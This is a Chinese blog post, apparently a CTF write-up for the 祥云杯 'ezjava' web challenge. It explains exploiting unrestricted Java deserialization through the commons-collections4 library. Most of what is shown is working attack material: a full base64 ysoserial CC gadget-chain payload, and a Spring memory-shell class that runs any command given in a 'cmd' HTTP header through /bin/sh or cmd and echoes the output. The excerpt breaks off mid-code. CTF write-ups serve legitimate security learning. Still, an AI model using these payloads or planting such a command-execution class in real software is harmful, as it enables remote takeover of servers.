<!-- build time:Sun Feb 19 2023 16:35:52 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="putao" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="putao" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="putao" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><link rel="canonical" href="http://example.com/2022/11/09/match/%E7%A5%A5%E4%BA%91%E6%9D%AF/"><title>祥云杯 - 比赛 | Putao0v0 = putao</title><meta name="generator" content="Hexo 6.2.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">祥云杯</h1><div class="meta"><span class="item" title="创建时间：2022-11-09 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2022-11-09T00:00:00+08:00">2022-11-09</time> </span><span class="item" title="本文字数"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">本文字数</span> <span>30k</span> <span class="text">字</span> </span><span class="item" title="阅读时长"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">阅读时长</span> <span>27 分钟</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">Putao0v0</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1dd76f144a01007af416d.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1dd75f144a01007af414b.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1df1af144a01007b2aea5.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1df1af144a01007b2ae36.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1dd6df144a01007af3559.jpg"></li><li class="item" data-background-image="https://pic.imgdb.cn/item/63f1df1af144a01007b2ae06.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/match/" itemprop="item" rel="index" title="分类于 比赛"><span itemprop="name">比赛</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/2022/11/09/match/%E7%A5%A5%E4%BA%91%E6%9D%AF/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/1.jpg"><meta itemprop="name" content="Putao0v0"><meta itemprop="description" content=", "></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="putao"></span><div class="body md" itemprop="articleBody"><h2 id="web"><a class="anchor" href="#web">#</a> Web</h2><h3 id="ezjava"><a class="anchor" href="#ezjava">#</a> ezjava</h3><p>下载附件审计</p><p>有两个路由 hello 和 myTest，在 myTest 出直接 post 传 payload，然后进行无限制的反序列化。查看一下 lib 发现有 commons-collections4.0 依赖，这就很容易想到 CC2 或 CC4 链，直接用 yso 生成 payload 进行反弹 shell。这里可能是由于一些特殊字符直接 hackbar 传没有用，所以用 python 传，但是没有反弹成功</p><p>本地测试一下 payload 对不对</p><p>jdk8u66</p><pre><code>java -jar ezjava-0.0.1-SNAPSHOT.jar
</code></pre><p>测试的 payload：</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci<span class="token operator">/</span>5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB<span class="token operator">+</span>AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh<span class="token operator">+</span>j<span class="token operator">/</span>a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAAdAAObmV3VHJhbnNmb3JtZXJ1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB3BAAAAANzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgALTAAFX25hbWVxAH4ACkwAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP<span class="token operator">//</span><span class="token operator">//</span>91cgADW1tCS<span class="token operator">/</span>0ZFWdn2zcCAAB4cAAAAAJ1cgACW0Ks8xf4BghU4AIAAHhwAAAGmsr<span class="token operator">+</span>ur4AAAA0ADkKAAMAIgcANwcAJQcAJgEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQATU3R1YlRyYW5zbGV0UGF5bG9hZAEADElubmVyQ2xhc3NlcwEANUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAKAEAM3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAqAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwALAAtCgArAC4BAARjYWxjCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMTg4MjQ4NzA4NzA4NzAwAQAgTHlzb3NlcmlhbC9Qd25lcjE4ODI0ODcwODcwODcwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA<span class="token operator">+</span>nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB<span class="token operator">+</span>ABgAAAHUyv66vgAAADQAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ<span class="token operator">+</span>AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABeA<span class="token operator">==</span></pre></td></tr></table></figure><p><img data-src="https://img-blog.csdnimg.cn/b22600417f2b4110b4b1b863d890125a.png" alt="Untitled"></p><p>本地 windows 环境下 payload 测试成功，因为不信邪自己还搭了一个 docker 环境放到云服务器上，发现反弹 shell 也是成功了的，说明只有一种可能就是题目不能出网，这样一下子就很难办了</p><p>最后经过各种信息搜集，发现可以利用 Spring 内存马进行回显</p><p><span class="exturl" data-url="aHR0cDovL3d3dy5ibXRoNjY2LmNuL2JtdGhfYmxvZy8yMDIyLzA5LzI3L1NwcmluZyVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQyVFNSVBRCVBNiVFNCVCOSVBMC8jU3ByaW5nJUU1JTg2JTg1JUU1JUFEJTk4JUU5JUE5JUFD">http://www.bmth666.cn/bmth_blog/2022/09/27/Spring 内存马学习 /#Spring 内存马</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjU4NTc1I2gyLTI=">https://www.anquanke.com/post/id/258575#h2-2</span></p><p><span class="exturl" data-url="aHR0cHM6Ly9teXp4Y2cuY29tLzIwMjEvMTEvU3ByaW5nLSVFNSU4NiU4NSVFNSVBRCU5OCVFOSVBOSVBQyVFNSVBRSU5RSVFNyU4RSVCMC8=">https://myzxcg.com/2021/11/Spring - 内存马实现 /</span></p><p>直接拿从万能的网络中找到的恶意类</p><figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>evil</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilTest</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token annotation punctuation">@Override</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token class-name">EvilTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token comment">//Runtime.getRuntime().exec("touch /tmp/test.txt");</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.context.request.RequestContextHolder"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token class-name">Method</span> m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRequestAttributes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token class-name">Object</span> o <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        c <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"org.springframework.web.context.request.ServletRequestAttributes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        m <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getResponse"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token class-name">Method</span> m1 <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRequest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token class-name">Object</span> resp <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token class-name">Object</span> req <span class="token operator">=</span> m1<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// HttpServletRequest</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token class-name">Method</span> getWriter <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"javax.servlet.ServletResponse"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getWriter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token class-name">Method</span> getHeader <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"javax.servlet.http.HttpServletRequest"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"getHeader"</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        getHeader<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        getWriter<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>        <span class="token class-name">Object</span> writer <span class="token operator">=</span> getWriter<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>getHeader<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token string">"cmd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>        <span class="token class-name">String</span> charsetName <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"window"</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"GBK"</span><span class="token operator">:</span><span class="token string">"UTF-8"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"os.name"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"WIN"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>            commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"cmd"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            commands<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/c"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>            commands<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>            commands<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"-c"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>        commands<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> cmd<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>        writer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"println"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>writer<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> charsetName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">useDelimiter</span><span class="token punctuation">(</span><span class="token string">"\\A"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        writer<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"flush"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>writer<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        writer<span class="token punctuation">.</span><span class="token 